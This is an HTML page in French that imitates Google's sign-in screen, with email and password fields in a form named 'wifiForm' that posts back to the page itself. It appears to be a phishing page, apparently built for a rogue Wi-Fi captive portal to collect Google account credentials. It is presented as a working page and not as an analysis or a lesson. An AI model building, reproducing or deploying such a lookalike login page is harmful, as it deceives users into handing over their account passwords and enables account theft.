<!doctype html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Connexion Google</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ffffff 0%, #ffffff 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #202124;
        }
        
        .container {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            width: 100%;
            max-width: 450px;
            margin: 20px;
            overflow: hidden;
        }
        
        .header {
            text-align: center;
            padding: 48px 40px 36px;
            border-bottom: none;
        }
        
        .google-logo {
            margin: 0 auto 16px;
            display: block;
        }
        
        .header h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin: 0 0 8px;
        }
        
        .header p {
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            margin: 0;
        }
        
        .form-container {
            padding: 0 40px 48px;
        }
        
        .form-group {
            margin-bottom: 24px;
            position: relative;
        }
        
        .form-group label {
            color: #5f6368;
            font-size: 14px;
            font-weight: 400;
            line-height: 1.4286;
            margin-bottom: 8px;
            display: block;
        }
        
        .form-group input {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 4px;
            color: #202124;
            font-size: 16px;
            height: 56px;
            padding: 13px 15px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }
        
        .form-group input:focus {
            border-color: #1a73e8;
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .form-group input:hover {
            border-color: #202124;
        }
        
        .forgot-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            margin-top: 8px;
            display: inline-block;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .info-text {
            color: #5f6368;
            font-size: 14px;
            line-height: 1.4286;
            margin: 24px 0;
        }
        
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .info-text a:hover {
            text-decoration: underline;
        }
        
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        
        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            padding: 9px 23px;
            border-radius: 4px;
            transition: background-color 0.2s ease;
        }
        
        .create-account:hover {
            background-color: rgba(26, 115, 232, 0.04);
        }
        
        .next-button {
            background: #1a73e8;
            border: none;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            height: 36px;
            min-width: 64px;
            padding: 0 24px;
            transition: background-color 0.2s ease, box-shadow 0.2s ease;
        }
        
        .next-button:hover {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
        }
        
        .next-button:focus {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(255,255,255,0.9);
            backdrop-filter: blur(10px);
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
            border-top: 1px solid #e8eaed;
        }
        
        @media (max-width: 480px) {
            .container {
                margin: 0;
                border-radius: 0;
                height: 100vh;
                display: flex;
                flex-direction: column;
            }
            
            .header {
                padding: 48px 24px 36px;
            }
            
            .form-container {
                padding: 0 24px 48px;
                flex: 1;
            }
            
            .footer {
                position: static;
                margin-top: auto;
            }
        }
        
        @media (max-width: 320px) {
            .header {
                padding: 32px 24px 24px;
            }
            
            .header h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">

            </svg>
            <h1>Se connecter</h1>
            <p>Utiliser votre compte Google</p>
        </div>
        
        <div class="form-container">
            <form id="wifiForm" method="post" novalidate>
                <div class="form-group">
                    <label for="email">Adresse e-mail ou téléphone</label>
                    <input type="email" id="email" name="email" required placeholder="Saisissez votre adresse e-mail">
                    <a href="#" class="forgot-link">Adresse e-mail oubliée ?</a>
                </div>
                
                <div class="form-group">
                    <label for="password">Saisissez votre mot de passe</label>
                    <input type="password" id="password" name="password" required placeholder="Saisissez votre mot de passe">
                </div>
                
                <p class="info-text">
                    Vous n'utilisez pas votre ordinateur ? Utilisez le mode invité pour vous connecter en privé. 
                    <a href="#">En savoir plus sur le mode invité</a>
                </p>
                
                <div class="actions">
                    <a href="#" class="create-account">Créer un compte</a>
                    <button type="submit" class="next-button">Suivant</button>
                </div>
            </form>
        </div>
    </div>
    
</body>
</html>
